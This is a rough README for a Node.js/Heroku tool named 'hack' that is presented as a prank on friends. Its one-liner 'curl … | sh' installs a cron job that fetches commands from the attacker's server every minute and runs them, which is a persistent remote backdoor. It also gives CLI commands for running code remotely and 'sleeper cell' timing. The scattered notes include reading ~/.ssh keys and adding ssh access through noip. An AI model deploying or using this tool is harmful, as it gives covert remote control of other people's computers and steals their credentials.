# Hack

## Getting Started

Clone, install, and link so you can use the `hack` cli tool.

```sh
git clone https://github.com/ccorcos/hack.git
cd hack
npm install
npm link
```

If you've never used Heroku before, [signup here](https://signup.heroku.com/) (it's free!) and set up their cli tool on your machine.

```sh
brew install heroku-toolbelt
heroku login
```

Create a Heroku app with an easy name to remember.

```sh
heroku create hacker-chet
```

The following command will get the root url for your Heroku webside and put it in your package.json. This way the server knows what to inject into the shell scripts.

```sh
npm run init
```

You can stand up the server locally if you want do you can hack yourself and test things out.

```sh
npm start
```

Or you can deploy to Heroku.

```sh
npm run deploy
```

Now you're ready to hack!

## API

The beauty of this program is that to start hacking someone, its just a one-liner!

```sh
curl <ROOT_URL>/hack | sh
```

`ROOT_URL` is the specific path to your application. When you're testing locally, this will be `localhost:5000` and when you deploy to heroku, it will be something like `<APP_NAME>.herokuapp.com`.

What this does is sets up a cron job to ping the /env/live endpoint every minute and pipes the result to `sh`. Pretty sweet right! And Heroku gives you HTTPS for free so I wouldn't be too worried about hacking yourself with it.

So once you've hacked your friend, you can do everything else with the commandline tool from your computer.










- dump endpoint
- 420 command
- register with noip and add ssh accepted hosts
- ls ~/.ssh/* | xargs cat



- git push heroku master


- heroku ps:scale web=1
- heroku open


- heroku logs --tail


- heroku local web



- xo?


# To Do

- CLI should generate shell scripts with "HACK_URL" which will get injected by express based on the heroku config

-

xo and test


update without pushing / redeploying?

heroku config:set HEROKU_URL=$(heroku info -s | grep web-url | cut -d= -f2)

























git
Start hacking someone by running this command from their Terminal: `curl -Ls chet.sh/hack | sh`. That sets up a cron job every minute which pings `curl chet.sh/live | sh`.

Now go to your commandline and we can start having some fun.

```
hack live exec "say hello world"
hack live interval 1y # sleeper cell
hack live cron "20 16 * * * * say 'its foe 20, ye better be toke-in'"
hack live reset
hack live forget
hack live rename jon
hack jon ...
```

# FYI

http://www.nncron.ru/help/EN/working/cron-format.htm

```
* * * * *
| | | | |
| | | | |
| | | | +---- Day of the Week   (range: 1-7, 1 standing for Monday)
| | | +------ Month of the Year (range: 1-12)
| | +-------- Day of the Month  (range: 1-31)
| +---------- Hour              (range: 0-23)
+------------ Minute            (range: 0-59)
```

# PS

How to make a Node.js CLI app: http://blog.npmjs.org/post/118810260230/building-a-simple-command-line-tool-with-npm

# PPS

Bought the domain name `chet.sh` here: https://www.nic.sh/

# To Do

- demo
- better readme
- better help
- better command validation
- configure with custom domain name

# Getting Started

```sh
git clone ...
cd hack
npm install
npm link
```

On your buddy's computer, just need to run this:

```sh
curl -sL chet.sh/hack | sh
```
